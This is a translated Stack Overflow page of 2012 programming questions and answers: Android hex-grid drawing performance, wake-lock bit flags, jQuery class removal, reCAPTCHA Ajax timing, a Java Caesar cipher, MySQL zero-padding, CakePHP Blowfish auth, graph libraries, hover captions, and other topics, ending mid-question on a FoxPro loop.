            paint.setColor(Color.WHITE);
            canvas.drawText(row + "," + column, map[column][row].x
                    - xOffset + 80, map[column][row].y - yOffset + 80,
                    paint);
            draws++;
        }
    }

    /** Log */
    paint.setColor(Color.WHITE);
    paint.setTextSize(20);
    canvas.drawText("xOffset: " + xOffset, 0, 30, paint);
    canvas.drawText("yOffset: " + yOffset, 0, 50, paint);
    canvas.drawText("activeTitlesX: " + updateArea(0) + " - "
            + updateArea(1), 0, 70, paint);
    canvas.drawText("activeTitlesY: " + updateArea(2) + " - "
            + updateArea(3), 0, 90, paint);
    canvas.drawText("DimX: " + MainActivity.DimX, 0, 110, paint);
    canvas.drawText("DimY: " + MainActivity.DimY, 0, 130, paint);
    canvas.drawText("Draws: " + draws, 0, 150, paint);

    Log.i(TAG, "Cleared canvas");
}

@Override
public void onConfigurationChanged(Configuration newConfig) {
    super.onConfigurationChanged(newConfig);
}

// called by thread
public static void update() {
    Log.i(TAG, "Updated Game");

}

@Override
public void surfaceChanged(SurfaceHolder holder, int format, int width,
        int height) {
    // TODO Auto-generated method stub

}

@Override
public void surfaceCreated(SurfaceHolder holder) {
    thread.setRunning(true);
    thread.start();
    Log.i(TAG, "Thread Started");

}

@Override
public void surfaceDestroyed(SurfaceHolder holder) {
    boolean retry = true;
    while (retry) {
        try {
            thread.join();
            retry = false;
        } catch (InterruptedException e) {
            // try again shutting down the thread
        }
    }
    Log.i(TAG, "Thread Destroyed");
}

@Override
public boolean onTouchEvent(MotionEvent event) {
    // touch down
    if (event.getAction() == MotionEvent.ACTION_DOWN) {
        // start of a new event, reset the flag
        _isMoving = false;
        // store the current touch coordinates for scroll calculation
        _xTouch = (int) event.getX();
        _yTouch = (int) event.getY();
    } else if (event.getAction() == MotionEvent.ACTION_MOVE) {
        // touch starts moving, set the flag
        _isMoving = true;

        // get the new offset
        xOffset += _xTouch - (int) event.getX();
        yOffset += _yTouch - (int) event.getY();

        // secure, that the offset is never out of view bounds
        if (xOffset < 0) {
            xOffset = 0;
        } else if (xOffset > boundaryWidth - getWidth()) {
            xOffset = boundaryWidth - getWidth();
        }
        if (yOffset < 0) {
            yOffset = 0;
        } else if (yOffset > boundaryHeight - getHeight()) {
            yOffset = boundaryHeight - getHeight();
        }

        // store the last position
        _xTouch = (int) event.getX();
        _yTouch = (int) event.getY();
    } else if (event.getAction() == MotionEvent.ACTION_UP) {
        /*
         * // touch released if (!_isMoving) { // calculate the touched cell
         * int column = (int) Math.ceil((_xOffset + event.getX()) /
         * _cellSize) - 1; int row = (int) Math.ceil((_yOffset +
         * event.getY()) / _cellSize) - 1; Cell cell =
         * _mapCells.get(row).get(column); // show the id of the touched
         * cell Toast.makeText(getContext(), "Cell id #" + cell._id,
         * Toast.LENGTH_SHORT).show(); }
         */
    }
    return true;
}

public int updateArea(int i) {
    switch (i) {
    case 0: // Left
        return Math.max(
                (int) (xOffset / (cellWidth - rightShift)) - buffer, 0);
    case 1: // Right
        return Math
                .min((int) (xOffset / (cellWidth - rightShift) + (int) (MainActivity.DimX / (cellWidth - rightShift)))
                        + buffer, mapWidth);
    case 2: // Up
        return Math.max((int) (yOffset / cellHeight) - buffer, 0);
    case 3: // Down
        return Math.min(((int) (yOffset / cellHeight))
                + (int) (MainActivity.DimY / cellHeight) + buffer,
                mapHeight);
    }
    return 0;
}

/* CELL CLASS */
class Cell {
    int x, y;
    boolean isShiftedDown;

    public Cell(int row, int col, boolean isShifted) {
        if (col % 2 != 0) {
            isShiftedDown = true;
            y = (int) (row * Game.cellHeight + Game.downwardShift);
            x = (int) (col * Game.cellWidth - col * Game.rightShift);
            Log.i("Shift", "Shifted" + Game.downwardShift);
        } else {
            isShiftedDown = false;
            y = (int) (row * Game.cellHeight);
            x = (int) (col * Game.cellWidth - col * Game.rightShift);
            Log.i("Shift", "Not Shifted");
        }
    }
} 
```

}

提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:15:26.483

基本算法分析表明您正在执行此操作：

```
map[i][j] = new Cell(j, i, isShiftedDownwards); 
```

22500次。您真的需要每次都创建一个新对象，或者您可以只更改现有对象中的变量吗？

* * *

更新：

```
for (int column = updateArea(0); column < updateArea(1); column++) {
    for (int row = updateArea(2); row < updateArea(3); row++) {
        canvas.drawBitmap(image[1], map[column][row].x - xOffset,
                map[column][row].y - yOffset, paint);
        paint.setColor(Color.WHITE);
        canvas.drawText(row + "," + column, map[column][row].x
                - xOffset + 80, map[column][row].y - yOffset + 80,
                paint);
        draws++;
    }
} 
```

所以这是有问题的双for循环。我将假设它需要运行尽可能多的次数来运行。循环语句中的函数调用是否可以简化为循环之前的变量（每个循环都对它们进行评估）？这`paint.setColor(Color.WHITE);`不应该在每次迭代中调用。如果您需要在第一次绘制后更改为白色，只需在启动时创建第二个绘制对象并在进入循环之前更改它。

如果这没有帮助，您需要确定是否可以迭代更小的区域。

* * *

更新 2 像这样重写你的 for 循环

```
int minCol = updateArea(0);
int maxCol = updateArea(1);
int minRow = updateArea(2);
int maxRow = updateArea(3);
for(int column = minCol; column < maxCol; column++)
    for (int row = minRow; column < maxRow; row++)
 .... 
```

这将代表每次迭代中的操作显着减少。

# java - 什么竖线（'|'）在android中是什么意思？

> ID：13845835
> 
> 赞同：0
> 
> 时间：2012-12-12T18:00:43.480
> 
> 标签：java, android, wakelock, powermanager

例如：

```
WakeLock wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK|
        PowerManager.ACQUIRE_CAUSES_WAKEUP|PowerManager.ON_AFTER_RELEASE, "Alarm"); 
```

**'| 是什么意思？' 字符是什么意思？**

* * *

有关该问题的更多详细信息：

我问这个是因为当我实例化唤醒锁时只有`PowerManager.AQUIRE_CAUSES_WAKEUP`程序停止工作，而当我使用上述方式时，它工作正常。

我想知道这是不是因为程序忽略了`ACQUIRE_CAUSES_WAKEUP`标签而最终没有被使用。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T18:02:23.143

该| 是按位或，它超越了 Android。它通常用于将多个选项填充到一个参数中。

所以 f(X|Y|Z) 形式的函数意味着函数应该使用选项 X、Y 和 Z。当然，X、Y 和 Z 应该适当编码以确保 | 将保持他们的价值观。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T18:03:27.927

[从文档](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/operators.html)

按位包含 OR => |

按位包含 OR (|) 运算符对两个操作数的每个并行位对执行按位包含 OR 运算。在每一对中，如果第一位或第二位为 1（或两者均为 1），则结果为 1。否则结果为 0。让我们看看使用包含运算的表格。让我们使用真值表来理解包含 OR 运算：

```
 (OR)

 A   B   Result
 0   0   0
 1   0   1
 0   1   1
 1   1   1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T18:16:01.743

如果您查看在您展示的示例类型中最常使用的常量`|`，它们的值是 2 的幂。例如：

```
Options.OPTION1 = 1;
Options.OPTION2 = 2;
Options.OPTION3 = 4;
Options.OPTION4 = 8; 
```

在二进制中（注意，为了便于阅读，我省略了 0b 前缀）：

```
Options.OPTION1 = 0001;
Options.OPTION2 = 0010;
Options.OPTION3 = 0100;
Options.OPTION4 = 1000; 
```

如果你使用`OR`Options.OPTION1和Options.OPTION3，结果是0101；

```
Options.OPTION1 | Options.OPTION3 => 0101 
```

这使您可以将多个值打包为一个，因为每个选项组合都是唯一的。

您可以通过 ANDing 选项从打包值中“提取”选项：

```
packedValue = Options.OPTION1 | Options.OPTION3;

packedValue & Options.OPTION3 => true;
packedValue & Options.OPTION4 => false; 
```

自从

```
0101 AND 0100 => 0100 => true 
```

和

```
0101 AND 1000 => 0000 => false 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T18:18:16.730

通常，该符号 ( `|`) 是按位或。它在 Android 之外的许多不同的语言和环境中使用。

它的用法是：

"X|Y : 如果 X 或 Y 为 1，则结果为 1"

在您的特定情况下，它被用来创建一个位字段。[请务必在此处](http://developer.android.com/reference/android/os/PowerManager.html)查看 Android 电源管理器代码库。

此 API 的可能标志是：

```
PARTIAL_WAKE_LOCK        = 0x01 
SCREEN_DIM_WAKE_LOCK     = 0x06
SCREEN_BRIGHT_WAKE_LOCK  = 0x0a
FULL_WAKE_LOCK           = 0x1a 
```

这些是互斥的（你只能选择一个），但你可以“或”其他一些标志：

```
ON_AFTER_RELEASE         = 0x20000000
ACQUIRE_CAUSES_WAKEUP    = 0x10000000 
```

因此，一旦您的代码运行它或将这些标志组合在一起，将导致：

```
 0x20000000
  | 0x10000000
  | 0x0000001a
---------------
    0x3000001a 
```

* * *

> 我问这个是因为当我只用“PowerManager.AQUIRE_CAUSES_WAKEUP”实例化唤醒锁时，程序停止工作

那是因为您***必须***选择唤醒锁定级别之一（`PARTIAL`、`SCREEN_DIM`、`SCREEN_BRIGHT`或`FULL`），您试图仅使用一个可选的唤醒锁定标志来运行......

# javascript - jQuery，一次更改 5 个项目

> ID：13845842
> 
> 赞同：-1
> 
> 时间：2012-12-12T18:01:06.340
> 
> 标签：javascript, jquery

如果我有这样的标记：

```
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li>
<li class="supress hidden"></li> 
```

我可以通过以下方式删除 class="hidden"：

```
if ($('.supress').hasClass('hidden')) {
    $('.supress').removeClass('hidden');
} 
```

**编辑：**在我尝试之前：

```
if ($('.supress:lt(5)').hasClass('hidden')) {
    $('.supress').removeClass('hidden');
} 
```

但是如果我只想从前五个项目中删除“隐藏”类怎么办？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-12T18:03:24.510

```
$(".supress.hidden:lt(5)").removeClass('hidden') 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-12T18:03:13.073

您可以获得具有多个类的元素，因此您无需检查是否具有类。

```
$('.supress.hidden').slice(0,5).removeClass('hidden'); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-12-12T18:03:02.683

我会使用[**$.slice**](http://api.jquery.com/slice/)来削减前 5 个：

```
$('.supress.hidden').slice(0, 5).removeClass('hidden'); 
```

虽然您可以将`:lt`选择器用于相同的结果，但不建议在[**其自己的页面上**](http://api.jquery.com/lt-selector/)使用：

> 因为`:lt()`是 jQuery 扩展而不是 CSS 规范的一部分，所以使用 :lt() 的查询不能利用原生 DOM querySelectorAll() 方法提供的性能提升。**为了在现代浏览器中获得更好的性能，请改用 $("your-pure-css-selector").slice(0, index)**。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-12T18:02:51.763

```
$('.supress').each(function(i){
     if(i < 5 && $(this).hasClass('hidden')){
          $(this).removeClass('hidden');
     }
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T18:07:40.893

jQuery 提供了很多方法来做到这一点：

*   查看[Traversing 的 jQuery 方法](http://api.jquery.com/category/Traversing/)。特别是，您可以使用[.slice() 方法](http://api.jquery.com/slice/)
*   查看高级[选择器](http://api.jquery.com/category/selectors/)。特别是['.supress:lt(5)'](http://api.jquery.com/lt-selector/)。

# php - 带有 Ajax 错误的 Recaptcha

> ID：13845850
> 
> 赞同：2
> 
> 时间：2012-12-12T18:01:41.823
> 
> 标签：php, jquery, ajax, recaptcha

我在验证 recaptcha 输入时遇到问题。这是我的代码：

```
// Validate Recaptcha Input
var challenge = $("#recaptcha_challenge_field").val();
var response = $("#recaptcha_response_field").val();

var dataString = 'recaptcha_challenge_field=' + challenge + '&recaptcha_response_field=' + response;

var html = $.ajax({
type: "POST",
    url: "PHP/recaptchaverify.php",
    data: dataString,
    async: true
}).responseText;

console.log(html);

if(html == 'accept') 
{
    alert("CORRECT");
}

else
{
    alert("The reCAPTCHA wasn't entered correctly. Go back and try it again.");
    $("#recaptcha_response_field").focus();
    Recaptcha.reload();
    return false;
} 
```

现在我将变量传递给 recpatchaverify.php

```
require_once('../scripts/recaptcha-php/recaptchalib.php');
$privatekey = "MYKEY";

$resp = recaptcha_check_answer ($privatekey, $_SERVER["REMOTE_ADDR"], $_POST["recaptcha_challenge_field"], $_POST["recaptcha_response_field"]);

if (!$resp->is_valid) 
{
    // What happens when the CAPTCHA was entered incorrectly
    echo "error";
} 

else 
{
    // Your code here to handle a successful verification
    echo "accept";
} 
```

现在我的问题是，每当我正确输入 Recaptcha 时，html 变量都会显示“接受”，但它在 IF 语句中不起作用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T20:30:14.677

您正在对服务器进行异步请求，这意味着当 $.ajax() 行完成并继续执行到 console.log() 和 if() 语句时，对服务器的实际请求仍处于挂起状态并且尚未尚未完成。在 if() 语句执行时，responseText 实际上是“未定义的”。

相反，您需要使用“成功”回调函数，如下所示：

```
// Validate Recaptcha Input
var challenge = $("#recaptcha_challenge_field").val();
var response = $("#recaptcha_response_field").val();

var dataString = 'recaptcha_challenge_field=' + challenge + '&recaptcha_response_field=' + response;

$.ajax({
    type: "POST",
    url: "PHP/recaptchaverify.php",
    data: dataString,
    success: function(html) {
        if(html == 'accept') 
        {
            alert("CORRECT");
        }

        else
        {
            alert("The reCAPTCHA wasn't entered correctly. Go back and try it again.");
            $("#recaptcha_response_field").focus();
            Recaptcha.reload();
            return false;
        }
    }
}); 
```

# java - 尝试用Java编写解密函数

> ID：13845855
> 
> 赞同：1
> 
> 时间：2012-12-12T18:01:57.467
> 
> 标签：java, encryption

我终于完成了插件，并开始着手另一个项目。该项目是一个简单的软件，可以在给定加密密钥和字符串本身的情况下加密字符串。所以我写了那个，它似乎工作正常，但我不知道如何解密它。我曾经有一个带有加密字母表的数组，但我想出了一种在加密函数中不使用它的方法，并且在解密时也应该有一种方法可以不使用它。

我的加密功能：

```
public static String e(String toEncrypt, int encKey) {
    encKey %= ALPHABET.length;
    toEncrypt = toEncrypt.toLowerCase();
    char[] TEChar = toEncrypt.toCharArray();
    for (int i = 0; i < toEncrypt.length(); i++) {
        for (int j = 0; j < ALPHABET.length; j++) {
            if (TEChar[i] == '`') {
                TEChar[i] = '_';
            }
            else if (TEChar[i] == ALPHABET[j]) {
                TEChar[i] = ALPHABET[(j + encKey) % ALPHABET.length];
                break;
            }
        }
    }
    toEncrypt = String.valueOf(TEChar) + "`" + encKey;
    return toEncrypt;
} 
```

ALPHABET （数组，我意识到它包含的不仅仅是字母表。）：

```
 char[] ALPHABET = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ' ', '1',
'2', '3', '4', '5', '6', '7', '8', '9', '0', ',', '.', ';', ':', '[', ']', '{',
'}', '?'}; 
```

我没有创建一个新数组来仅包含偏移字符，而是通过简单的添加和使用余数运算符来做到这一点。我尝试使用减法和同样的方法，但它不起作用，因为我需要它来回绕到 26。不知何故，我觉得解决方案是显而易见的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:48:26.747

试试这个：

```
public static String e(String toEncrypt, int encKey, boolean addEncKey) {       
    encKey %= ALPHABET.length;
    toEncrypt = toEncrypt.toLowerCase();
    char[] TEChar = toEncrypt.toCharArray();
    for (int i = 0; i < toEncrypt.length(); i++) {
        for (int j = 0; j < ALPHABET.length; j++) {
            if (TEChar[i] == '`') {
                TEChar[i] = '_';
            } else if (TEChar[i] == ALPHABET[j]) {
                TEChar[i] = ALPHABET[(j + encKey + ALPHABET.length)
                        % ALPHABET.length];
                break;
            }
        }
    }
    if (addEncKey) {
        toEncrypt = String.valueOf(TEChar) + "`" + encKey;
    } else {
        toEncrypt = String.valueOf(TEChar);
    }
    return toEncrypt;
} 
```

这就是我测试它的方式：

```
public static void main(String[] args) {
        String encoded = e("ABDSDfz}", 2, true);
        System.out.println(encoded);
        String decoded = e(
encoded.substring(0, encoded.indexOf("`")),
                -Integer.parseInt(encoded.substring(encoded.indexOf("`") + 1)),
                false);
        System.out.println(decoded);

    } 
```

如您所见，我将一些逻辑移至方法调用（您可以轻松编写一个包含加密的解密函数，如下所示：

```
public static String decrypt(String encoded) {
return e(encoded.substring(0, encoded.indexOf("`")),
                    -Integer.parseInt(encoded.substring(encoded.indexOf("`") + 1)),
                    false);
} 
```

解密和加密的工作方式基本相同，但解密使用相反的 encKey（例如，它将使用 -22 而不是 22），这是在调用中完成的。您在 '`' 符号后添加 encKey - 我不希望在解码的消息中使用它，所以我在将编码字符串解析为方法并添加布尔参数 addEncKey 时将其删除，因此我可以禁用添加 addEncKey。我还在代码中更改了这一行： TEChar[i] = ALPHABET[(j + encKey + ALPHABET.length) % ALPHABET.length]; 这是处理 encKey 为负时可能发生的负索引的简单方法。

# mysql - MySQL将前导数字添加到列中的现有ID

> ID：13845866
> 
> 赞同：1
> 
> 时间：2012-12-12T18:02:39.200
> 
> 标签：mysql, phpmyadmin, sql-update

我有一个名为 country_id 的 mysql 数据库列，例如：

```
country_id
----------
1
2
59
435
2714 
```

我现在要完成的是为每个 ID 添加前导零，因此结果将是：

```
country_id
----------
0001
0002
0059
0435
2714 
```

每个 ID 最多应有 4 位数字。就是这样。

我可以在 PHPmyAdmin 中使用任何 SQL 语句以上述方式更新这个 country_id 列吗？

最好的祝福！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T18:09:04.413

`ZEROFILL`在列上声明：

```
mysql> create table foobar (nr integer(4) ZEROFILL);
Query OK, 0 rows affected (0.31 sec)

mysql> INSERT INTO foobar VALUES (1),(12),(123),(1234),(12345);
Query OK, 5 rows affected (0.05 sec)
Records: 5  Duplicates: 0  Warnings: 0

mysql> SELECT * FROM foobar;
|  0001 
|  0012 
|  0123 
|  1234 
| 12345 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T18:14:09.963

如果`country_id`列是字符数据类型（非数字），那么您可以在前面加上零并取最右边的部分：

```
UPDATE foo SET country_id = RIGHT(CONCATENATE('0000',country_id),4)

UPDATE foo SET country_id = LPAD(country_id, 4, '0') 
```

（注意：如果 country_id 的任何值`country_id`超过 4 个字符，则这些语句中的任何一个都将导致数据丢失......第一个获取最右边的字符，第二个将获取最左边的四个字符，如果 country_id 超过四个字符。如果一个值有一个前导“-”字符，这将导致一个奇怪的值，例如“00-4”。LTRIM 函数可用于删除前导空格。

* * *

另一方面，如果`country_id`是数字数据类型，则不能真正添加​​前导零。

对于整数类型，您可以指定显示长度和 ZEROFILL 选项，例如

```
country_id INT(4) ZEROFILL 
```

但是由客户端应用程序使用长度修饰符和 ZEROFILL 属性来执行指定的格式设置，实际上并没有在“数据库中”使用这些属性进行任何操作。（MySQL 命令行客户端将观察这些设置，并显示填充到最多四个字符的值零。但其他客户端不需要这样做。）

您还可以将该值转换为字符并在查询中使用前导 '0' 字符填充它：

```
SELECT LPAD(country_id, 4, '0') AS country_id 
```

但请注意，这将返回字符类型，而不是数字。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:07:05.480

```
SELECT LPAD(country_id, 4, '0')
FROM your_table 
```

如果您可以更改数据库结构，请使用[ZEROFILL](http://dev.mysql.com/doc/refman/5.5/en/numeric-type-attributes.html)

# php - 如何使用 CakePHP 的新 Blowfish/Bcrypt 作为密码

> ID：13845872
> 
> 赞同：4
> 
> 时间：2012-12-12T18:03:00.370
> 
> 标签：php, cakephp, bcrypt

假设我是[CakePHP](http://cakephp.org)的新手。[让我们进一步假设我已经完全按照本教程](http://book.cakephp.org/2.0/en/tutorials-and-examples/blog-auth-example/auth.html)中的内容编写了我的用户身份验证（除了其中的错误让我浪费了一个多小时试图弄清楚）。

2.3的[迁移指南](http://book.cakephp.org/2.0/en/appendices/2-3-migration-guide.html)说`bcrypt`已将其添加到核心哈希算法中。关于如何实际实现这一点的唯一提示是：

> 您现在可以在 $authenticate 数组中使用 Blowfish 以允许使用 bcrypt 密码。

我完全不知道这意味着什么，也不知道我现在如何在这里使用 bcrypt。谷歌搜索它只会导致指南，它不会指导我。我很想知道我如何准确地激活它——假设我的设置与上面提到的教程中的一样，在哪里放置选项以及编写什么内容才能正常工作。

此外，这是否需要特殊版本的 PHP，或者它是否适用于 CakePHP 支持的任何版本？

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T00:06:25.333

如果您要使用尚未稳定的代码（2.3 是 RC），文档会很吓人，您需要在没有文档的情况下弄清楚一些事情。即使没有文档，代码也可以免费获得并且[有注释](https://github.com/cakephp/cakephp/blob/2.3/lib/Cake/Utility/Security.php#L82-L97)

Blowfish 有自己的身份[验证适配器](https://github.com/cakephp/cakephp/blob/2.3/lib/Cake/Test/Case/Controller/Component/Auth/BlowfishAuthenticateTest.php)，您需要使用它。

如果文档没有帮助，您也可以查看[测试](https://github.com/cakephp/cakephp/blob/2.3/lib/Cake/Test/Case/Utility/SecurityTest.php#L109-L194)，因为测试提供了 100 个示例，它比任何文档都好得多。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-26T16:28:23.607

如果您已经成功使用表单身份验证，则换成您`'Form'`的`'Blowfish'`身份验证适配器，即

```
class AppController extends Controller {
    public $helpers = array("Html","Form", "Js", "Csv");
    public $components = array(
           'Auth' => array(
                'authenticate' => array(
                    'Blowfish' => array(/* your settings */) 
                )
            )
        );
        /* ... */
    } 
```

然后你需要将你的调用更改为`AuthComponent::password`（如果你按照教程可能在你的用户模型中`beforeSave`）从

```
AuthComponent:password($pwd) 
```

到

```
Security::hash($pwd,'blowfish'); 
```

因为 AuthComponent 的密码方法被实现为使用您的 Security.salt 设置，这不适用于河豚（它会生成一个新的盐并将其存储在密码哈希中）。

另请注意，CakePHP 中的实现以 $2a$ 作为 salt 前缀，这在 PHP 5.3.7 之前存在安全问题（请参阅[此注释](http://www.php.net/security/crypt_blowfish.php)）。

# jquery - 需要有关实施可能性的建议（基于 Web）

> ID：13845875
> 
> 赞同：-1
> 
> 时间：2012-12-12T18:03:09.020
> 
> 标签：jquery, html, css

嗨，我正在做一个小爱好项目，我想以一种相当新的方式可视化足球联赛表。问题是我不知道该怎么做，这就是你们这些聪明人进来的地方。

说我想做这样的事情

![在此处输入图像描述](../Images/1497b6d6eedc170b6d56fa06e203700d.png)

列表中的每个元素都应该是可点击的，并且它应该像[Gephi](https://gephi.org/)那样表现得像当我悬停一个团队时，该团队连接到的所有链接都被点亮。

![在此处输入图像描述](../Images/4166e679b1611254c2d5b1df262f3cf1.png)

现在我的问题是，你会建议如何实施这个？我可以使用任何软件，任何完整的框架来实现这一目标？我目前正在使用 Jquery 作为下拉菜单。

最重要的是，它应该是一个基于 Web 的解决方案，因此使用 html jquery、css 等（IE 不使用 gephi 并使用 java 小程序，这是最后的选择）

抱歉，如果这是发布此类问题的错误社区，但由于它在某种意义上是一个技术问题，我认为它适合这里 =)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:09:20.797

我建议查看一些不同的 Javascript 图形库。[在Graph visualization code in javascript](https://stackoverflow.com/questions/7034/graph-visualization-code-in-javascript)上有很好的讨论？特别是以下库：

*   [sigma.js](http://sigmajs.org/)（[演示](http://sigmajs.org/examples.html)）
*   [乔木.js](http://arborjs.org/)
*   [D3](http://d3js.org/)（[鼠标悬停示例](http://bost.ocks.org/mike/uberdata/)）
*   [拉斐尔](http://raphaeljs.com/)（另见[德古拉](http://www.graphdracula.net/)）
*   [JIT](http://philogb.github.com/jit/)（[演示](http://philogb.github.com/jit/demos.html)）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:20:58.120

让我们看看... 让整个事情成为一个形象。剪下每个会亮的图像。用它的发光对应物使它成为一个精灵。通过绝对位置将每个精灵定位在您想要的位置。悬停部分可能是一个问题。为了在 css 中执行此操作，团队关联的每个图像都需要嵌套在父悬停图像中。这是可能的。所以你说像 div#team-map b#top-level:hover b#another {...}

# javascript - 悬停图像时显示说明

> ID：13845879
> 
> 赞同：1
> 
> 时间：2012-12-12T18:03:23.033
> 
> 标签：javascript, jquery, jquery-ui

我有这个 HTML：

```
<div class="left_area">
 <div class="caption"> 
   <a href="<?php echo $URL; ?>"><img src="<?php echo $images; ?>" alt="<?php echo $name; ?>" /></a>
   <span>test</span></div>
</div> 
```

当我用鼠标浏览图像时，我希望在该范围内显示我想要的任何内容，甚至是按钮或粗体文本的图像。像这样的[例子](http://www.bensoutlet.com/)

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:09:21.517

尝试这样的事情 -[**演示**](http://jsfiddle.net/F6p2Z/2/)

***CSS***

```
.caption {
    position: relative;
    width: 300px;
    cursor: pointer;
}

span {
    display: none;
    position: absolute;
    left: 0;
    top: 0;
    background: rgba(0, 0, 0, .7);
    height: 200px;
    width: 300px;
    color: #fff;
} 
```

***JS***

```
$('.caption').on({
    mouseover: function() {
        $(this).find('span').fadeIn(200);
    },

    mouseout: function() {
        $(this).find('span').stop().fadeOut(200);
    },
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:14:20.637

试试这个

```
$(document).ready(function(){
  $('a','.caption').mouseenter(function(){
     $('span',$(this).parent()).show();
  }).mouseleave(function(){
     $('span',$(this).parent()).hide();
  }); 
```

});​</p>

参考 [http://jsfiddle.net/puu5u/9/](http://jsfiddle.net/puu5u/9/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:08:52.540

您可以在 CSS 中执行此操作

### HTML

```
​&lt;div class="image">
<p class="caption">Some info related the pic</p>
<img src="http://i.imgur.com/VMaxsb.jpg" />
</div>​ 
```

### CSS

```
.image {float: left; position: relative;}
.image .caption {width: 100%; height: 100%; background: rgba(0,0,0,0.82); position: absolute; color: #fff; display: none}
.image:hover​ .caption {display: block;}​ 
```

演示 - [http://jsfiddle.net/hqLjz/](http://jsfiddle.net/hqLjz/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T18:18:15.543

试试这个：

```
$('ul li').mouseenter(function(){
    var image= $(this).find('img'),
        caption = $(this).find('div');

    caption.width(image.width());
    caption.height(image.height());
    caption.fadeIn();
}).mouseleave(function(){
     var image= $(this).find('img'),
        caption = $(this).find('div');

    caption.width(image.width());
    caption.height(image.height());
    caption.fadeOut();
});​ 
```

[小提琴](http://jsfiddle.net/ZVvND/)

# google-places-api - 谷歌在实际超过限制之前放置 api 请求 - OVER_QUERY_LIMIT

> ID：13845888
> 
> 赞同：2
> 
> 时间：2012-12-12T18:03:58.957
> 
> 标签：google-places-api

我开发了一个谷歌地方应用程序来获取有关地方的信息。我已经通过谷歌验证了我的身份，根据限制，我每天最多应该被允许 100 000 个请求。但是，在低于 300 个请求（每天通过不同的数量）之后，我收到了消息：OVER_QUERY_LIMIT。任何类似的经验或想法如何使请求能够通过？

谢谢你。D 松懈

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-20T08:59:57.677

您可以在以下位置跟踪您的请求

[https://code.google.com/apis/console/?noredirect#:stats](https://code.google.com/apis/console/?noredirect#:stats)

# objective-c - 放大许多 UITextView

> ID：13845889
> 
> 赞同：0
> 
> 时间：2012-12-12T18:04:01.593
> 
> 标签：objective-c, ios, ipad, uitextview

我在 UIScrollView 中有很多 UITextView 和 UIImageView。我创建的这个 UITextViews 和 UIImageView 是动态的。如果我创建的这些元素是动态的，我该如何放大和缩小？有时我有一个 UITextView 和一个 UIImageView，有时我有两个 UIImageViews 和一个 UITextView 等等......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T19:25:00.027

您需要创建一个视图（`UIView`或 的子类`UIView`），其中包含您想要放大的所有内容并在`UIScrollView`的`viewForZoomingInScrollView:`委托方法中返回它。

显然相应地设置`contentSize`,`maximumZoomScale`和`minimumZoomScale`属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:12:56.877

您需要找出 UIScrollView 的 contentSize。循环遍历所有添加的 UIView 并确定右下角的那个，然后抓住它的帧原点 + 大小，这应该是完整大小，然后将 scrollview.contentSize 设置为该 CGSize 值。

# weblogic - WebLogic 问题中的部署

> ID：13845895
> 
> 赞同：1
> 
> 时间：2012-12-12T18:04:44.637
> 
> 标签：weblogic

我是新手。我正在使用 Weblogic 10.0.0.0 ..我在第一页（登录页面 wit 用户名和密码）中收到验证错误，因为“记录器未初始化”，同时部署。我对tomcat做同样的事情，导入和部署.war是成功的。是什么原因？而且，在 weblogic 10.0.0.0 中，我们有两个 jdk（jdk 1.6 和 Jrockit）......在我的系统中，我有 1.6.0_17 ..所以它需要哪个。我忘记了我在安装时选择了哪个......它是否来自wblogic jdk 还是哪一个？..我哪里出错了..我注意到它很小..但无法弄清楚..请让我知道？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T18:13:53.797

这可能是因为您没有正确配置 WLS 安装。首次设置控制台时，您必须在身份验证文件中更改一个参数，如果未设置该参数，则会导致此问题。

或者您在部署期间从管理控制台选择日志记录，并且您尚未在应用程序中配置 log4j。

# foxpro - FoxPro 9.0 如何循环播放程序

> ID：13845896
> 
> 赞同：1
> 
> 时间：2012-12-12T18:04:46.680
> 
> 标签：foxpro

我有一个任务来循环遍历单个列表“合同”，并且对于每个循环，使用合同中的值调用一个程序“MyProgram”。最后将所有循环的结果显示在表格中。

```
Indata:
=================
Contracts.dbf
=================
P01
C04
CH45
T31

Result:
===========================
ResultFile.dbf
===========================
P01   C04    CH45     T31
---------------------------
100    11    302     -872
9.63   0     45.2     342 
```

在 MyProgram 中生成每个合同的值，该程序将合同作为参数，并生成一列与标题相同合同的结果。所以使用 MyProgram 合同 P01 给

```
======
